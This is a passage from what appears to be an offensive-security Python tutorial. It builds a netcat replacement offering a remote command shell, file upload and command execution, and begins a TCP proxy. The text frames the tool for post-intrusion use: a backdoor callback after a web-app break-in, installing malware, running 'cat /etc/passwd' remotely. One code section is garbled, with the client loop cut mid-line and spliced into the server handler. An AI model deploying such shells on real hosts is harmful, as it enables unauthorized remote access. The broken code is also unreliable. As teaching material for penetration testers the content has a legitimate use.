That’s it! Pretty simple, but this is a very useful piece of code which we
will extend in the next couple of sections when we build a netcat replace-
ment and a TCP proxy.
Replacing netcat
Netcat is the utility knife of networking, so it’s no surprise that shrewd
systems administrators remove it from their systems. On more than one
occasion, I’ve run into servers that do not have netcat installed but do
have Python. In these cases, it’s useful to create a simple network client
and server that you can use to push files, or to have a listener that gives you
command-line access. If you’ve broken in through a web application, it is
definitely worth dropping a Python callback to give you secondary access
without having to first burn one of your trojans or backdoors. Creating a
tool like this is also a great Python exercise, so let’s get started.
import sys
import socket
import getopt
import threading
import subprocess
# define some global variables
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0
Here, we are just importing all of our necessary libraries and setting
some global variables. No heavy lifting quite yet.
The Network: Basics 13
Now let’s create our main function responsible for handling command-
line arguments and calling the rest of our functions.
u def usage():
print "BHP Net Tool"
print
print "Usage: bhpnet.py -t target_host -p port"
print "-l --listen - listen on [host]:[port] for ¬
incoming connections"
print "-e --execute=file_to_run - execute the given file upon ¬
receiving a connection"
print "-c --command - initialize a command shell"
print "-u --upload=destination - upon receiving connection upload a ¬
file and write to [destination]"
print
print
print "Examples: "
print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
sys.exit(0)
def main():
global listen
global port
global execute
global command
global upload_destination
global target
if not len(sys.argv[1:]):
usage()
# read the commandline options
v try:
opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:", ¬
["help","listen","execute","target","port","command","upload"])
except getopt.GetoptError as err:
print str(err)
usage()
for o,a in opts:
if o in ("-h","--help"):
usage()
elif o in ("-l","--listen"):
listen = True
elif o in ("-e", "--execute"):
execute = a
elif o in ("-c", "--commandshell"):
command = True
elif o in ("-u", "--upload"):
upload_destination = a
14 Chapter 2
elif o in ("-t", "--target"):
target = a
elif o in ("-p", "--port"):
port = int(a)
else:
assert False,"Unhandled Option"
# are we going to listen or just send data from stdin?
w if not listen and len(target) and port > 0:
# read in the buffer from the commandline
# this will block, so send CTRL-D if not sending input
# to stdin
buffer = sys.stdin.read()
# send data off
client_sender(buffer)
# we are going to listen and potentially
# upload things, execute commands, and drop a shell back
# depending on our command line options above
if listen:
x server_loop()
main()
We begin by reading in all of the command-line options v and setting
the necessary variables depending on the options we detect. If any of the
command-line parameters don’t match our criteria, we print out useful
usage information u. In the next block of code w, we are trying to mimic
netcat to read data from stdin and send it across the network. As noted, if
you plan on sending data interactively, you need to send a ctrl-D to bypass
the stdin read. The final piece x is where we detect that we are to set up
a listening socket and process further commands (upload a file, execute a
command, start a command shell).
Now let’s start putting in the plumbing for some of these features, start-
ing with our client code. Add the following code above our main function.
def client_sender(buffer):
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
# connect to our target host
client.connect((target,port))
u if len(buffer):
client.send(buffer)
The Network: Basics 15
while True:
# now wait for data back
recv_len = 1
response = ""
v while recv_len:
data = client.recv(4096)
recv_len = len(data)
response+= data
if recv_len  ")
# now we receive until we see a linefeed ¬
(enter key)
cmd_buffer = ""
while "\n" not in cmd_buffer:
cmd_buffer += client_socket.recv(1024)
# send back the command output
response = run_command(cmd_buffer)
# send back the response
client_socket.send(response)
Our first chunk of code u is responsible for determining whether our
network tool is set to receive a file when it receives a connection. This can
18 Chapter 2
be useful for upload-and-execute exercises or for installing malware and
having the malware remove our Python callback. First we receive the file
data in a loop v to make sure we receive it all, and then we simply open a
file handle and write out the contents of the file. The wb flag ensures that we
are writing the file with binary mode enabled, which ensures that upload-
ing and writing a binary executable will be successful. Next we process our
execute functionality w, which calls our previously written run_command func-
tion and simply sends the result back across the network. Our last bit of
code handles our command shell x; it continues to execute commands as
we send them in and sends back the output. You’ll notice that it is scanning
for a newline character to determine when to process a command, which
makes it netcat-friendly. However, if you are conjuring up a Python client
to speak to it, remember to add the newline character.
Kicking the Tires
Now let’s play around with it a bit to see some output. In one terminal or
cmd.exe shell, run our script like so:
justin$ ./bhnet.py -l -p 9999 -c
Now you can fire up another terminal or cmd.exe, and run our script in
client mode. Remember that our script is reading from stdin and will do so
until the EOF (end-of-file) marker is received. To send EOF, hit ctrl-D on
your keyboard:
justin$ ./bhnet.py -t localhost -p 9999
 ls -la
total 32
drwxr-xr-x 4 justin staff 136 18 Dec 19:45 .
drwxr-xr-x 4 justin staff 136 9 Dec 18:09 ..
-rwxrwxrwt 1 justin staff 8498 19 Dec 06:38 bhnet.py
-rw-r--r-- 1 justin staff 844 10 Dec 09:34 listing-1-3.py
 pwd
/Users/justin/svn/BHP/code/Chapter2
You can see that we receive back our custom command shell, and
because we’re on a Unix host, we can run some local commands and
receive back some output as if we had logged in via SSH or were on the
box locally. We can also use our client to send out requests the good, old-
fashioned way:
justin$ echo -ne "GET / HTTP/1.1\r\nHost: www.google.com\r\n\r\n" | ./bhnet. ¬
py -t www.google.com -p 80
HTTP/1.1 302 Found
Location: http://www.google.ca/
Cache-Control: private
Content-Type: text/html; charset=UTF-8
The Network: Basics 19
P3P: CP="This is not a P3P policy! See http://www.google.com/support/ ¬
accounts/bin/answer.py?hl=en&answer=151657 for more info."
Date: Wed, 19 Dec 2012 13:22:55 GMT
Server: gws
Content-Length: 218
X-XSS-Protection: 1; mode=block
X-Frame-Options: SAMEORIGIN
302 Moved
302 Moved
The document has moved
here.
[*] Exception! Exiting.
justin$
There you go! It’s not a super technical technique, but it’s a good foun-
dation on how to hack together some client and server sockets in Python
and use them for evil. Of course, it’s the fundamentals that you need most:
use your imagination to expand or improve it. Next, let’s build a TCP proxy,
which is useful in any number of offensive scenarios.
Building a tcP Proxy
There are a number of reasons to have a TCP proxy in your tool belt, both
for forwarding traffic to bounce from host to host, but also when assessing
network-based software. When performing penetration tests in enterprise
environments, you’ll commonly be faced with the fact that you can’t run
Wireshark, that you can’t load drivers to sniff the loopback on Windows, or
that network segmentation prevents you from running your tools directly
against your target host. I have employed a simple Python proxy in a num-
ber of cases to help understand unknown protocols, modify traffic being
sent to an application, and create test cases for fuzzers. Let’s get to it.
import sys
import socket
import threading
def server_loop(local_host,local_port,remote_host,remote_port,receive_first):
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
server.bind((local_host,local_port))
except:
print "[!!] Failed to listen on %s:%d" % (local_host,local_ ¬
port)
print "[!!] Check for other listening sockets or correct ¬
permissions."
sys.exit(0)
20 Chapter 2
print "[*] Listening on %s:%d" % (local_host,local_port)